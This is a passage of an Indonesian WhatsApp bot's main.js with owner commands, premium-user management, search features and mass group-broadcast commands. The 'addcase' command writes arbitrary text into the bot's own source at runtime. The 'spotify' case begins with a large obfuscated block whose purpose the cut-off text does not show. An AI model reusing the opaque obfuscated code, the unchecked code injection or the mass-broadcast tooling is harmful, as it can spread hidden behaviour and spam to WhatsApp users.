              document: await fs.readFileSync("./main.zip"),
              mimetype: "application/zip",
              fileName: "main.zip",
            },
            { quoted: fcall }
          );
          await execSync("rm -rf ZʏɴxᴢᴏxXI.zip");
        }
        break
        
case 'getcase': {
const getCase = (cases) => {
            return "case "+`'${cases}'`+fs.readFileSync("./main.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
        }
            try{
                if (!isCreator) return reply('ngapain')
                if (!q) return reply(`contoh : ${prefix + command} antilink`)
                let nana = await getCase(q)
                reply(nana)
            } catch(err){
            console.log(err)
            reply(`Case ${q} tidak di temukan`)
        }
}
        break

case 'biochange':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'enable') {
                    autobio = true
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                } else if (q == 'disable') {
                    autobio = false
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                }
                break   
                
case 'autobio': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: wm
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ctext(`click button *enable* to enable autobio\nclick button *disable* to disable autobio`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".biochange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".biochange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await zynX.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'readchange':
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`Contoh ${prefix + command} enable/disable`)
if (q === 'enable') {
autoread = true
m.reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'disable') {
autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
break

case 'autoread': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: wm
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ctext(`click button *enable* to enable autoread\nclick button *disable* to disable autoread`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".readchange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".readchange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await zynX.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'public': {
if (!isCreator) return reply(mess.owner) 
zynX.public = true
reply('*_Sukses Change To Public_*')
}
break

case 'self': {
if (!isCreator) return reply(mess.owner) 
zynX.public = false
reply('*_Sukses Change To Self_*')
}
break
        
case 'addprem':{
if (!isCreator) return reply(mess.owner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
} else {
var cekap = await zynX.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break

case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./zyn/database/premium.json', JSON.stringify(premium))
reply('Sukses!')
} else {
var cekpr = await zynX.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./zyn/database/premium.json', JSON.stringify(premium))
reply('Sukses!')
}}
break

case 'listpremium': case 'listprem': {
if (!isCreator) return reply(mess.owner)
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = Func.readTime(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
zynX.sendTextWithMentions(m.chat, txt, m)
}
break

case "bcimg": {
if (!isCreator) return reply(`Lu Zʏɴxᴢᴏ Kah?`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await loading()
let getGroups = await zynX.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await zynX.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await zynX.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await zynX.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply(mess.owner)
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await zynX.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
zynX.sendMessage(i, {text: `${text}`}, {quoted:fcall})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'restart':
if (!isCreator) return reply('wuuu')
reply(`_Restarting Bot . . ._`)
await sleep(3000)
process.exit()
break

case 'delcase': {
if (!isCreator) return reply(`*Access Denied ❌*\n\n*Owners only*`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./main.js', q)
reply('*Dellcase Successfully*\n\n© Dellcase By Zʏɴxᴢᴏ')
}
break

case 'addcase': {
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'main.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break

case "listgc":{
if (!isCreator) return (`Ngapain ? Khusus Zʏɴxᴢᴏ Offcial Aja !!`)
let getGroups = await zynX.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await zynX.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
//—————「 OWNER MENU 」—————//



//—————「 SEARCH MENU 」—————//
case 'lirik': {
if (!args[0]) return reply("Judulnya?")
reply(mess.search)
let d = await fetchJson(`https://aemt.me/lirik?text=${args[0]}`)
zynX.sendMessage(m.chat, { text: d.result.lyrics }, { quoted: fcall })
}
break
case 'pinterest': case 'pin': {
  if (!text) return reply(`Enter Query`);
  //try {
  await m.reply(mess.wait);

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: zynX.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 10); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: wm
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"url","Klik disini":"${pus}","merchant_url":"${pus}"}`
          }
        ]
      })
    });
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hai\nDibawah ini Adalah hasil dari Pencarian Kamu'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await zynX.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });
  
}
break

case 'spotify':
case 'spotifydl':{
(function(_0x55b1b0,_0x467891){const _0x34c6f4=_0x55b1b0();function _0x32b112(_0x2a1e7d,_0x589940,_0x28e32c,_0x212518,_0x4e45d4){return _0x1574(_0x2a1e7d- -0x314,_0x589940);}function _0x16ccfb(_0x5c3a5f,_0x49c094,_0x410290,_0x2bf9c5,_0x3ce161){return _0x1574(_0x49c094-0x2cf,_0x3ce161);}function _0x160ed4(_0x420958,_0x4ee14f,_0x4ee243,_0x3c63cc,_0x4b5318){return _0x1574(_0x420958-0x2fc,_0x4b5318);}function _0x4c0307(_0x118293,_0x1756a0,_0xcf5a3,_0x5e65b0,_0x3c2f86){return _0x1574(_0xcf5a3-0x2b4,_0x3c2f86);}function _0xdf9090(_0xa1ce85,_0x53799b,_0x55dc69,_0x2ab2c8,_0x350830){return _0x1574(_0x55dc69- -0x31a,_0x350830);}while(!![]){try{const _0x3455c6=parseInt(_0x16ccfb(0x5fb,0x55b,0x51b,0x4a4,0x573))/(-0x19d1*-0x1+0x6*-0xa4+-0x15f8)+-parseInt(_0x160ed4(0x604,0x601,0x5cb,0x683,0x592))/(0x1c79+-0x19f6+-0x281*0x1)+parseInt(_0x32b112(-0xe3,-0x111,-0x97,-0x176,-0x62))/(0x121*-0x7+-0x987+0x1171)+parseInt(_0x160ed4(0x590,0x58a,0x5d5,0x5b7,0x59a))/(-0x11b0+-0x1ecd+0x1*0x3081)*(parseInt(_0xdf9090(-0xab,0x0,-0x54,-0x63,-0x88))/(-0x13f3*-0x1+0x8*-0x409+0xba*0x11))+parseInt(_0x4c0307(0x5d8,0x62d,0x590,0x5bb,0x57b))/(0x1*-0x1ab9+0x1eba+-0x3fb*0x1)+parseInt(_0x4c0307(0x5c1,0x504,0x5b6,0x593,0x52d))/(0x1*-0x19f1+0x24cb+-0xad3)*(parseInt(_0x16ccfb(0x59a,0x4fc,0x488,0x4e0,0x4bd))/(-0x124f+-0xfa9+-0x4*-0x880))+-parseInt(_0x160ed4(0x63c,0x650,0x684,0x687,0x5b3))/(0x1266+0x192d+-0x1*0x2b8a);if(_0x3455c6===_0x467891)break;else _0x34c6f4['push'](_0x34c6f4['shift']());}catch(_0x483acd){_0x34c6f4['push'](_0x34c6f4['shift']());}}}(_0x388a,-0xca9d*-0x15+-0x11b7f9+0xb50b8));const _0x263442=(function(){function _0x30dda2(_0x462220,_0x27b5f2,_0x256430,_0x4d61ac,_0x44f520){return _0x1574(_0x462220- -0x39f,_0x4d61ac);}const _0x4e2db6={'WzeyK':function(_0x588085,_0x8929b3){return _0x588085(_0x8929b3);},'rttUT':_0x246bfc(-0xc0,-0xf0,-0x1a2,-0xa6,-0x131)+_0x246bfc(-0x35,0x3b,-0x39,0x97,-0x2b)+_0x486540(0x2f5,0x2b1,0x336,0x30b,0x31a)+_0x33b73c(0x50c,0x52f,0x545,0x4df,0x5d0)+_0x375b72(0x39b,0x301,0x3a4,0x335,0x388)+_0x246bfc(-0x32,0x11,-0x2,0x51,-0xa3)+_0x30dda2(-0xeb,-0x163,-0x8b,-0x108,-0x134)+_0x246bfc(-0xba,-0x93,-0x10a,-0x34,-0x3)+_0x486540(0x34d,0x399,0x3b4,0x380,0x3b5)+_0x246bfc(-0x104,-0x67,-0x6a,-0x7f,0x31),'Qtqiv':function(_0xc0e8a5,_0x5649de){return _0xc0e8a5!==_0x5649de;},'SWrrT':_0x375b72(0x3ad,0x2ba,0x38d,0x266,0x315),'SfBnW':function(_0x3c347a,_0x8c9fe4){return _0x3c347a===_0x8c9fe4;},'APSsS':_0x30dda2(-0x138,-0x154,-0x1ab,-0xb6,-0x1d2),'oezzN':function(_0x166f0b,_0x412673){return _0x166f0b!==_0x412673;},'TUgLT':_0x246bfc(-0x6,-0x35,0x5c,-0xb6,-0x5b)};function _0x375b72(_0x4a6f1e,_0x4de816,_0x14e05e,_0x48a22a,_0x14d676){return _0x1574(_0x14d676-0xf9,_0x48a22a);}function _0x33b73c(_0x1e4ed9,_0x41a5a5,_0x50d799,_0x41f49,_0x2189b3){return _0x1574(_0x41a5a5-0x319,_0x2189b3);}function _0x486540(_0x34c71,_0x4432f9,_0xed4728,_0x391803,_0x415225){return _0x1574(_0x415225-0xe6,_0xed4728);}function _0x246bfc(_0x5f1209,_0x29a90f,_0x5f27ab,_0x559c8b,_0x320088){return _0x1574(_0x29a90f- -0x2d9,_0x5f27ab);}let _0x8ff267=!![];return function(_0x2d8371,_0x13d705){function _0x345b16(_0x5a806d,_0x35b496,_0x53a895,_0x1b1041,_0x4ac762){return _0x33b73c(_0x5a806d-0xf1,_0x1b1041- -0x491,_0x53a895-0x59,_0x1b1041-0x164,_0x53a895);}function _0x43137b(_0xde888d,_0x3dd563,_0x5f0a8d,_0x273fea,_0x631330){return _0x246bfc(_0xde888d-0xf9,_0x3dd563-0x2b,_0xde888d,_0x273fea-0x11a,_0x631330-0xc3);}function _0x483358(_0x4c44f8,_0x29535d,_0x107a17,_0x2bf887,_0x193e4b){return _0x30dda2(_0x4c44f8-0x40d,_0x29535d-0xe1,_0x107a17-0x1a7,_0x29535d,_0x193e4b-0x1a3);}const _0x173d95={'stEAo':function(_0xca89a6,_0x525635){function _0x19c35d(_0x371a6c,_0x456eb6,_0x1c0ab2,_0x8ed493,_0x55eca7){return _0x1574(_0x371a6c-0x148,_0x55eca7);}return _0x4e2db6[_0x19c35d(0x441,0x406,0x3e7,0x3ea,0x4d6)](_0xca89a6,_0x525635);},'wwSyl':_0x4e2db6[_0x39d15f(0x4b7,0x3da,0x40e,0x3be,0x398)],'jQPwm':function(_0x160e58,_0x428ea6){function _0x1d6fe8(_0x4aecf,_0x1683d4,_0xc4771c,_0x258547,_0x57ed4d){return _0x39d15f(_0x4aecf-0x170,_0x1683d4-0xe9,_0xc4771c- -0x3b5,_0x4aecf,_0x57ed4d-0x23);}return _0x4e2db6[_0x1d6fe8(0xc7,0xf9,0xcf,0x82,0xe6)](_0x160e58,_0x428ea6);},'hsCqE':_0x4e2db6[_0x39d15f(0x47b,0x48c,0x495,0x548,0x490)],'Yoack':function(_0x2191c7,_0x561473){function _0x1b4048(_0x17a2a6,_0x245e5c,_0x582134,_0x1d3e43,_0x18896e){return _0x39d15f(_0x17a2a6-0xc2,_0x245e5c-0x70,_0x245e5c- -0x509,_0x17a2a6,_0x18896e-0x1b8);}return _0x4e2db6[_0x1b4048(-0x49,-0x7a,-0x73,-0x81,-0x8b)](_0x2191c7,_0x561473);},'VnpWf':_0x4e2db6[_0x39e580(0x537,0x40d,0x49a,0x506,0x487)]};function _0x39d15f(_0x2b7b5a,_0x5b71c0,_0x378c37,_0x1aedcb,_0x56d588){return _0x486540(_0x2b7b5a-0x1a1,_0x5b71c0-0xf9,_0x1aedcb,_0x1aedcb-0x1c0,_0x378c37-0xd0);}function _0x39e580(_0x8e09b7,_0x489ec0,_0x5a1ca0,_0x456c8d,_0x2ebc3a){return _0x246bfc(_0x8e09b7-0x42,_0x2ebc3a-0x40e,_0x456c8d,_0x456c8d-0x45,_0x2ebc3a-0x1a7);}if(_0x4e2db6[_0x483358(0x2c3,0x333,0x299,0x242,0x229)](_0x4e2db6[_0x43137b(-0x1d,-0x9,-0xbe,0x8b,-0x96)],_0x4e2db6[_0x43137b(0x84,-0x9,0x2e,0x2c,-0xbf)]))_0x1e2f16=_0x5f3cba;else{const _0x312000=_0x8ff267?function(){function _0x17fc27(_0x200adc,_0x55eb2f,_0x2409bf,_0x32d219,_0x24adfc){return _0x43137b(_0x24adfc,_0x32d219-0x3d7,_0x2409bf-0x47,_0x32d219-0xa6,_0x24adfc-0x14a);}const _0x92897e={'AVukz':function(_0x503d06,_0x174e87){function _0x4e02ea(_0x7e7795,_0x21ca05,_0x3b383d,_0x266ee4,_0x55df67){return _0x1574(_0x3b383d- -0x3a9,_0x7e7795);}return _0x173d95[_0x4e02ea(-0x161,-0x16c,-0x134,-0x188,-0x90)](_0x503d06,_0x174e87);},'BonIq':_0x173d95[_0x2878de(0x52d,0x620,0x582,0x588,0x5ab)]};function _0x5c6c35(_0x35b6be,_0xb9b05d,_0x82766c,_0x71d0e7,_0x411f5f){return _0x39e580(_0x35b6be-0x1a9,_0xb9b05d-0x53,_0x82766c-0x67,_0x71d0e7,_0xb9b05d-0x28a);}function _0x5ce0f9(_0x542b9d,_0x2e2c99,_0x5f0fcf,_0x2ea32b,_0x2c4036){return _0x345b16(_0x542b9d-0x99,_0x2e2c99-0xe7,_0x5f0fcf,_0x542b9d-0x4da,_0x2c4036-0x135);}function _0x3875fa(_0x5a6bc6,_0x493137,_0x3247cb,_0x590d91,_0x11361e){return _0x345b16(_0x5a6bc6-0x67,_0x493137-0x131,_0x590d91,_0x3247cb- -0x210,_0x11361e-0x153);}function _0x2878de(_0x34eff0,_0x3dbac3,_0x2008d0,_0x1fc66b,_0x25645d){return _0x39d15f(_0x34eff0-0x1b7,_0x3dbac3-0x10b,_0x2008d0-0x15b,_0x1fc66b,_0x25645d-0x2d);}if(_0x173d95[_0x17fc27(0x281,0x3e9,0x30f,0x339,0x2ec)](_0x173d95[_0x3875fa(-0x175,-0x163,-0x12c,-0x17f,-0x1cc)],_0x173d95[_0x5c6c35(0x598,0x61b,0x5eb,0x565,0x688)]))return _0x3d4d10;else{if(_0x13d705){if(_0x173d95[_0x5ce0f9(0x554,0x543,0x585,0x52c,0x5c1)](_0x173d95[_0x5ce0f9(0x696,0x675,0x698,0x696,0x6aa)],_0x173d95[_0x5c6c35(0x6c4,0x6f3,0x642,0x652,0x698)])){const _0x50a187=_0x13d705[_0x2878de(0x604,0x5d1,0x5fc,0x5ad,0x693)](_0x2d8371,arguments);return _0x13d705=null,_0x50a187;}else return _0x92897e[_0x3875fa(-0x1a7,-0x103,-0x11c,-0x139,-0x95)](_0x3d4f8c,_0x92897e[_0x5ce0f9(0x65a,0x6c1,0x670,0x5f3,0x6c6)]);}}}:function(){};return _0x8ff267=![],_0x312000;}};}()),_0x2d9394=_0x263442(this,function(){const _0x5067a0={};function _0xf6a78d(_0x226b5d,_0x597a82,_0x4313e1,_0x117d2c,_0x3e2665){return _0x1574(_0x4313e1- -0x176,_0x3e2665);}function _0x3e2f6c(_0x186d29,_0x5e7a62,_0x280ee2,_0x5e4921,_0x59c5d9){return _0x1574(_0x59c5d9-0xdd,_0x5e4921);}function _0x345dec(_0x1c51f5,_0x592b15,_0x484035,_0xc07e21,_0x1c93b9){return _0x1574(_0x484035-0x127,_0x1c93b9);}_0x5067a0[_0x345dec(0x482,0x4a5,0x425,0x37e,0x3a8)]=_0x345dec(0x26d,0x2df,0x31b,0x30f,0x30d)+_0x49c557(0x633,0x5f5,0x5a5,0x5da,0x656)+'+$';const _0xcd3a3f=_0x5067a0;function _0x2ba9f2(_0x33029a,_0x4d0484,_0xec32b,_0x33cca9,_0x2dc4ef){return _0x1574(_0xec32b- -0x2b8,_0x33029a);}function _0x49c557(_0x587fb6,_0x41e5cb,_0x16a339,_0x4d7c92,_0x13e34b){return _0x1574(_0x587fb6-0x2e3,_0x4d7c92);}return _0x2d9394[_0x345dec(0x325,0x316,0x3ad,0x375,0x3d7)+_0x345dec(0x3f0,0x4e6,0x471,0x3fc,0x4a0)]()[_0xf6a78d(0x1a2,0x15f,0x130,0x100,0x168)+'h'](_0xcd3a3f[_0x345dec(0x425,0x38b,0x425,0x3f7,0x38c)])[_0xf6a78d(0x191,0xf1,0x110,0xbd,0x69)+_0x49c557(0x62d,0x614,0x6d2,0x5cf,0x5c4)]()[_0x3e2f6c(0x384,0x33a,0x388,0x380,0x3a0)+_0x2ba9f2(0x59,0xd7,0x2d,0x67,0xb)+'r'](_0x2d9394)[_0xf6a78d(0xf4,0xc1,0x130,0x136,0xff)+'h'](_0xcd3a3f[_0x49c557(0x5e1,0x54f,0x5e8,0x603,0x572)]);});_0x2d9394();const _0x579c0f=(function(){function _0x36cd72(_0x529d6b,_0xa9a2f,_0x20195e,_0xf59f5c,_0x4638b9){return _0x1574(_0x529d6b-0x9f,_0x20195e);}function _0x4dc55b(_0x4de776,_0x60ee20,_0x143a67,_0x21e377,_0x5c21a5){return _0x1574(_0x143a67- -0x2e,_0x60ee20);}function _0x4aeb2d(_0x3bf1d7,_0x591894,_0x42373b,_0x2bb10e,_0x30d9ed){return _0x1574(_0x42373b- -0x215,_0x30d9ed);}const _0x2f9507={'XhXOI':function(_0x2f6eb2,_0x46d741){return _0x2f6eb2(_0x46d741);},'OsgBw':function(_0x3f02aa,_0x206bba){return _0x3f02aa+_0x206bba;},'rsXod':_0xeefd97(0x3b9,0x34a,0x39d,0x356,0x2a9)+_0x4aeb2d(0x16a,0x9d,0x125,0x174,0xfd)+_0xeefd97(0x329,0x3ae,0x2cd,0x313,0x2f5)+_0x4aeb2d(0x1a4,0xf7,0x10a,0xc9,0xa6),'AWnbH':_0x145610(0x466,0x3b2,0x4b6,0x474,0x479)+_0xeefd97(0x438,0x456,0x414,0x3f9,0x454)+_0x36cd72(0x3bf,0x3e7,0x447,0x37b,0x3d9)+_0x4aeb2d(0xa8,0x90,0x109,0xce,0x199)+_0x36cd72(0x3f0,0x3bc,0x417,0x412,0x3b2)+_0xeefd97(0x3b6,0x480,0x357,0x3fa,0x3d7)+'\x20)','rqiDY':function(_0x22a158,_0x160bda){return _0x22a158!==_0x160bda;},'WPTVH':_0x36cd72(0x3a4,0x3dd,0x363,0x416,0x3c1),'oereG':function(_0x349c40,_0x20dba1){return _0x349c40===_0x20dba1;},'Ldiul':_0x4dc55b(0x2b8,0x321,0x288,0x2fc,0x28e),'FuwiI':_0x4aeb2d(0x162,0x15d,0x111,0xed,0x59),'GOcvW':function(_0x2164ff,_0x46ed26){return _0x2164ff!==_0x46ed26;},'ZgsoC':_0x36cd72(0x36f,0x330,0x2e8,0x3b8,0x427)};function _0x145610(_0x112900,_0xd0bd51,_0x13e3c3,_0x19c01e,_0x418dde){return _0x1574(_0x112900-0x208,_0x418dde);}function _0xeefd97(_0x2bed7a,_0x19230f,_0x228fd3,_0x10f347,_0x5dd545){return _0x1574(_0x10f347-0x112,_0x5dd545);}let _0x1924d1=!![];return function(_0x265901,_0x430953){function _0x1ff0d8(_0x35a15b,_0x5a0cc3,_0x4f5e9b,_0x33b8cd,_0x4023cd){return _0x36cd72(_0x4f5e9b- -0x134,_0x5a0cc3-0x19a,_0x33b8cd,_0x33b8cd-0x21,_0x4023cd-0x6b);}function _0x450779(_0x1dad3b,_0x3fe997,_0x483d08,_0x462599,_0x205124){return _0x36cd72(_0x3fe997-0x106,_0x3fe997-0x31,_0x483d08,_0x462599-0x1a4,_0x205124-0x1af);}function _0x5d8d02(_0x1ef839,_0x3ef599,_0x4801ca,_0x37c42f,_0x376b47){return _0x4dc55b(_0x1ef839-0x59,_0x37c42f,_0x1ef839- -0x29b,_0x37c42f-0x10d,_0x376b47-0xc6);}function _0x3d88e7(_0x1f91d4,_0x5c847d,_0x1418ce,_0x400794,_0x276a87){return _0xeefd97(_0x1f91d4-0x1aa,_0x5c847d-0x157,_0x1418ce-0xe0,_0x1418ce- -0x4f3,_0x1f91d4);}const _0xfd539={'EAAtu':function(_0x3aa0e7,_0x54cb6a){function _0x12317e(_0x11d202,_0x4f1da4,_0x191ab4,_0x1ebb58,_0x1213ca){return _0x1574(_0x1213ca-0x38a,_0x1ebb58);}return _0x2f9507[_0x12317e(0x576,0x5d7,0x61e,0x53a,0x5da)](_0x3aa0e7,_0x54cb6a);},'WzgEU':function(_0x1d4fcd,_0x5ddff3){function _0x2b0d07(_0x2b5fe8,_0xa0b640,_0x84111d,_0x59f17c,_0x38f28f){return _0x1574(_0x59f17c- -0xd5,_0xa0b640);}return _0x2f9507[_0x2b0d07(0x1e6,0x165,0x1a1,0x138,0xc2)](_0x1d4fcd,_0x5ddff3);},'wiOul':_0x2f9507[_0x450779(0x3d2,0x3db,0x452,0x450,0x389)],'yixkv':_0x2f9507[_0x1bee24(0x2b1,0x361,0x343,0x27f,0x2b6)],'dmgVu':function(_0x17e844,_0x2a04b6){function _0x65d09a(_0xd63704,_0x12d9b6,_0x536c17,_0x486e71,_0xab162e){return _0x450779(_0xd63704-0xb9,_0xab162e- -0x2c3,_0x486e71,_0x486e71-0xce,_0xab162e-0x3d);}return _0x2f9507[_0x65d09a(0x171,0x163,0x1ef,0x255,0x1ce)](_0x17e844,_0x2a04b6);},'YmMGb':_0x2f9507[_0x3d88e7(-0x1af,-0x225,-0x1e2,-0x16f,-0x269)],'RlUGV':function(_0x2d3e21,_0x34fbff){function _0x12d919(_0x4bf68c,_0x5782b9,_0x4150eb,_0x16f6a3,_0x7f480a){return _0x3d88e7(_0x7f480a,_0x5782b9-0x65,_0x16f6a3-0x126,_0x16f6a3-0x83,_0x7f480a-0x11b);}return _0x2f9507[_0x12d919(0x69,-0xa1,-0x2d,-0x3e,-0x98)](_0x2d3e21,_0x34fbff);},'sCrfG':_0x2f9507[_0x5d8d02(0x42,-0x4a,0x3a,0x15,0x69)],'rasga':_0x2f9507[_0x3d88e7(-0x16c,-0x236,-0x1f3,-0x14c,-0x16f)]};function _0x1bee24(_0x52f9c9,_0x4bb979,_0x3001a1,_0x26900b,_0x3b4c05){return _0x145610(_0x3b4c05- -0x223,_0x4bb979-0x15f,_0x3001a1-0x1df,_0x26900b-0x1b4,_0x4bb979);}if(_0x2f9507[_0x1bee24(0x2b4,0x387,0x365,0x278,0x329)](_0x2f9507[_0x3d88e7(-0x70,-0xb5,-0xb6,-0x14b,-0xc7)],_0x2f9507[_0x1ff0d8(0x31b,0x32e,0x296,0x20b,0x30a)]))return![];else{const 